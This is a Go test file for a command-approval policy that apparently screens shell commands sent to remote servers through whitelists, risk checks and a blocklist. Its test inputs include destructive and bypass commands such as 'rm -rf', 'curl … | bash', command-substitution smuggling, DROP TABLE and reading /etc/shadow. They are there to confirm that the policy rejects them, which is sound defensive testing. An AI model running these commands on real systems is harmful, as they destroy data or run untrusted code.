package policy

import (
	"reflect"
	"strings"
	"testing"

	"rex/internal/config"
)

func testConfig() *config.Config {
	return &config.Config{Whitelist: []config.WhitelistRule{
		{Pattern: "tail *", Servers: []string{"*"}, Note: "tail"},
		{Pattern: "grep *", Servers: []string{"*"}, Note: "grep"},
		{Pattern: "wc *", Servers: []string{"*"}},
		{Pattern: "journalctl *", Servers: []string{"*"}},
		{Pattern: "jq *", Servers: []string{"*"}},
		{Pattern: "cat *", Servers: []string{"prod"}},
		{Type: "download", Pattern: "/var/log/*", Servers: []string{"*"}},
		{Type: "forward", Pattern: "localhost:5432", Servers: []string{"prod"}},
	}}
}

func raws(cmds []Command) []string {
	out := make([]string, len(cmds))
	for i, c := range cmds {
		out[i] = c.Op + "|" + c.Raw
	}
	return out
}

func TestAnalyzeSplitsCommands(t *testing.T) {
	tests := []struct {
		in   string
		want []string
	}{
		{"tail -n 100 /var/log/app.log", []string{"|tail -n 100 /var/log/app.log"}},
		{"journalctl CONTAINER_TAG=app -o cat | jq 'select(.level >= 50)'",
			[]string{"|journalctl CONTAINER_TAG=app -o cat", "||jq 'select(.level >= 50)'"}},
		{"echo 'hello | world' | grep hello", []string{"|echo 'hello | world'", "||grep hello"}},
		{`grep "a && b" file | wc -l`, []string{`|grep "a && b" file`, "||wc -l"}},
		{"a && b || c ; d", []string{"|a", "&&|b", "|||c", ";|d"}},
		{"a\nb", []string{"|a", ";|b"}},
		{"(a; b) | c", []string{"|a", ";|b", "||c"}},
		{"FOO=1 cmd x", []string{"|FOO=1 cmd x"}},
		{"tail 2>/dev/null -n 5 f", []string{"|tail -n 5 f"}},
	}
	for _, tt := range tests {
		got := raws(Analyze(tt.in, nil).Commands)
		if !reflect.DeepEqual(got, tt.want) {
			t.Errorf("Analyze(%q) = %q, want %q", tt.in, got, tt.want)
		}
	}
}

func TestWhitelist(t *testing.T) {
	cfg := testConfig()
	tests := []struct {
		server, cmd string
		want        bool
	}{
		{"prod", "tail -n 5 /var/log/app.log", true},
		{"prod", "tail -f a.log | grep ERROR | wc -l", true},
		{"prod", "tail a.log 2>&1 | grep x", true},
		{"prod", "tail a.log 2>/dev/null", true},
		{"prod", "cat /etc/hosts", true},
		{"staging", "cat /etc/hosts", false}, // rule limited to prod
		{"prod", "tail a.log | sort", false},
		{"prod", "tail a.log | wc", true}, // "wc *" covers a bare "wc"
		// bypasses of the old operator splitter
		{"prod", "tail a\nrm -rf /tmp/x", false},
		{"prod", "tail a & rm -rf /tmp/x", false},
		{"prod", "tail $(rm -rf /tmp/x)", false},
		{"prod", "tail `id`", false},
		{"prod", "tail a > /etc/hosts", false},
		{"prod", "tail a >> out.log", false},
		{"prod", "tail <(rm x)", false},
		{"prod", "for f in *.log; do tail $f; done", false},
		{"prod", "tail 'unterminated", false},
		{"prod", "", false},
	}
	for _, tt := range tests {
		ev := EvaluateExec(cfg, tt.server, tt.cmd, nil)
		if ev.Whitelisted != tt.want {
			t.Errorf("EvaluateExec(%s, %q).Whitelisted = %v, want %v (constructs=%v opaque=%v)",
				tt.server, tt.cmd, ev.Whitelisted, tt.want, ev.Constructs, ev.Opaque)
		}
	}
}

func TestRisks(t *testing.T) {
	cfg := testConfig()
	tests := []struct {
		cmd   string
		stdin string
		risky bool
	}{
		{"ls -la /var/log", "", false},
		{"tail -n 5 a.log | grep x", "", false},
		{"docker ps && docker logs api --tail 100", "", false},
		{"kill $(pgrep -f api)", "", true},
		{"ls; rm -rf /opt/app", "", true},
		{"sudo rm -rf /opt/app", "", true},
		{"sudo -u root rm -rf /opt/app", "", true},
		{"find . -name '*.log' | xargs rm", "", true},
		{"find /tmp -mtime +7 -delete", "", true},
		{"echo $(reboot)", "", true},
		{"bash -c 'systemctl restart nginx'", "", true},
		{"bash -lc \"ls && reboot\"", "", true},
		{"sh -c \"$CMD\"", "", true},
		{"eval \"$X\"", "", true},
		{"$CMD arg", "", true},
		{"psql -c 'DROP TABLE users'", "", true},
		{"psql mydb", "delete from users;", true},
		{"psql mydb", "select * from users;", false},
		{"bash -s", "systemctl stop nginx\n", true},
		{"bash -s", "uptime\n", false},
		{"bash <<'EOF'\nreboot\nEOF", "", true},
		{"curl -s https://x.sh | bash", "", true},
		{"echo hi > /etc/motd", "", true},
		{"echo hi > /tmp/x", "", false},
		{"timeout 10 kill 123", "", true},
		{"git push origin main --force", "", true},
		{"git push origin main", "", false},
	}
	for _, tt := range tests {
		ev := EvaluateExec(cfg, "prod", tt.cmd, []byte(tt.stdin))
		if got := len(ev.Risks) > 0; got != tt.risky {
			t.Errorf("EvaluateExec(%q, stdin=%q) risky = %v, want %v (risks=%v)", tt.cmd, tt.stdin, got, tt.risky, ev.Risks)
		}
	}
}

func TestEvaluateTarget(t *testing.T) {
	cfg := testConfig()
	if !EvaluateTarget(cfg, "download", "prod", "/var/log/nginx/access.log").Whitelisted {
		t.Error("download under /var/log should be whitelisted")
	}
	if EvaluateTarget(cfg, "download", "prod", "/etc/shadow").Whitelisted {
		t.Error("download of /etc/shadow should not be whitelisted")
	}
	if EvaluateTarget(cfg, "upload", "prod", "/var/log/x").Whitelisted {
		t.Error("download rules must not apply to uploads")
	}
	if !EvaluateTarget(cfg, "forward", "prod", "localhost:5432").Whitelisted {
		t.Error("forward rule should match")
	}
	if ev := EvaluateTarget(cfg, "upload", "prod", "/etc/nginx/nginx.conf"); len(ev.Risks) == 0 {
		t.Error("upload into /etc should be risky")
	}
}

func TestBlocklistConfig(t *testing.T) {
	cfg := testConfig()
	cfg.AutoApprove.DisableDefaultBlocklist = true
	cfg.AutoApprove.Blocklist = []string{"deploy *"}
	if ev := EvaluateExec(cfg, "prod", "rm -rf /x", nil); len(ev.Risks) != 0 {
		t.Errorf("default blocklist should be disabled, got %v", ev.Risks)
	}
	if ev := EvaluateExec(cfg, "prod", "DEPLOY now", nil); len(ev.Risks) == 0 || !strings.Contains(ev.Risks[0], "deploy *") {
		t.Errorf("custom blocklist should match case-insensitively, got %v", ev.Risks)
	}
}

func TestGlobPattern(t *testing.T) {
	cmds := Analyze("FOO=1 /usr/bin/tail -n 5 x | grep y", nil).Commands
	if got := GlobPattern(cmds[0]); got != "/usr/bin/tail *" {
		t.Errorf("GlobPattern = %q", got)
	}
	if got := GlobPattern(cmds[1]); got != "grep *" {
		t.Errorf("GlobPattern = %q", got)
	}
}
